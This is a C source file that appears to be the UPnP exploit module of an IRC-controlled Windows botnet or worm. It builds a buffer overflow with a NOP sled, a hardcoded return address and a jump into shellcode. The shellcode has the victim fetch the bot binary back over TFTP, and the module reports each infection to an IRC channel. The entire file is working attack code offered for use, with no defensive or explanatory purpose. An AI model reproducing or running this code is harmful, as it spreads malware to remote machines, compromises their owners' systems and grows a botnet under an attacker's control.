#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_UPNP

BOOL upnp(EXINFO exinfo)
{
	char sendbuf[IRCLINE],szRequest[2048],szJmpCode[281],szExeCode[840];
	int i;

	for(i = 0; i < 268; i++) 
		szJmpCode[i] = (char)0x90;

	szJmpCode[268]=(char)0x4D; szJmpCode[269]=(char)0x3F;
	szJmpCode[270]=(char)0xE3; szJmpCode[271]=(char)0x77;
	szJmpCode[272]=(char)0x90; szJmpCode[273]=(char)0x90;
	szJmpCode[274]=(char)0x90; szJmpCode[275]=(char)0x90;
	
	//jmp [ebx+0x64], jump to execute shellcode
	szJmpCode[276]=(char)0xFF; szJmpCode[277]=(char)0x63;
	szJmpCode[278]=(char)0x64; szJmpCode[279]=(char)0x90;
	szJmpCode[280]=(char)0x00;

	for(i = 0; i < 32; i++) 
		szExeCode[i] = (char)0x90;
	szExeCode[32] = (char)0x00;

	char *sc = (char *)malloc(4096);
	DWORD scsize = GetRNS0TerminatedShellcode(sc, 4096, GetIP(exinfo.sock), filename);
	if (!scsize) {
		free(sc);
		return FALSE;
	}

	strcat(szExeCode, sc);
	sprintf(szRequest, "%s%s\r\n\r\n", szJmpCode, szExeCode);

	SOCKET sSock = fsocket(AF_INET, SOCK_STREAM, 0);
	if (sSock == SOCKET_ERROR) {
		free(sc);
		return FALSE;
	}

	// Fill in sockaddr and resolve the host
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)exinfo.port);
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	memset(ssin.sin_zero, 0, 8);

	// Connect to the server
	if (fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR) { // Connect failed, exit 
		free(sc);
		fclosesocket(sSock);
		return FALSE;
	}

	// Send the request
	if (fsend(sSock, szRequest, strlen(szRequest)+1,0) == SOCKET_ERROR) {
		free(sc);
		fclosesocket(sSock);
		return FALSE;
	}

	free(sc);
	fclosesocket(sSock);

	sprintf(sendbuf,"[TFTP]: File transfer complete to IP: %s", exinfo.ip);
	for (i=0; i < 6; i++) {
		if (searchlog(sendbuf)) {
//			sprintf(sendbuf, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
			if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
			addlog(sendbuf);
			exploit[exinfo.exploit].stats++;

			break;
		}
		Sleep(5000);
	}

	return TRUE;
}
#endif